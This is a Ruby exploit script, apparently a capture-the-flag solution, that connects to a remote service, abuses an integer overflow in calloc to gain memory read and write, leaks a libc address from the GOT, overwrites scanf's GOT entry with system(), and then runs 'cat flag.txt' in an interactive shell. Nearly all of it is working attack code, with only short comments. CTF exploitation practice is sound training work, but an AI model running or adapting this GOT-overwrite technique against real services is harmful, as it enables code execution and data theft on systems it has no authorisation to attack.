#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end

host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port

ADDR_GOT_SCANF = 0x602048
ADDR_GOT_CALLOC = 0x602038 

OFFSET_LIBC_CALLOC = 0x9a030
OFFSET_LIBC_SYSTEM = 0x4f440


def num n
    puts 2**64
    $s.puts 2**64
    print $s.expect("\n> ")[0]
end

def set x, d
    puts "set #{x} #{d}"
    $s.puts "set #{x} #{d}"
    print $s.expect("\n> ")[0]
end

def get x
    puts "get #{x}"
    $s.puts "get #{x}"
    answer = $s.expect("\n> ")[0]
    print answer
    return answer[/^\d*$/].to_i
end

def bye
    puts "bye"
    $s.puts "bye"
end


print $s.expect("\n> ")[0]

# calloc returns 0
num(2**64)

# leak libc pointer from GOT
libc_calloc = get(ADDR_GOT_CALLOC/8)
log("LIBC_calloc: " + libc_calloc.to_s(16))

# calculate libc base address
libc_base = libc_calloc - OFFSET_LIBC_CALLOC
log("LIBC_BASE: " + libc_base.to_s(16))

# overwrite scanf with system
libc_system = libc_base + OFFSET_LIBC_SYSTEM
log("LIBC_SYSTEM: " + libc_system.to_s(16))
set(ADDR_GOT_SCANF/8, libc_system)

# system("cat flag.txt")
puts "cat flag.txt\n"
$s.puts "cat flag.txt"


$s.interact
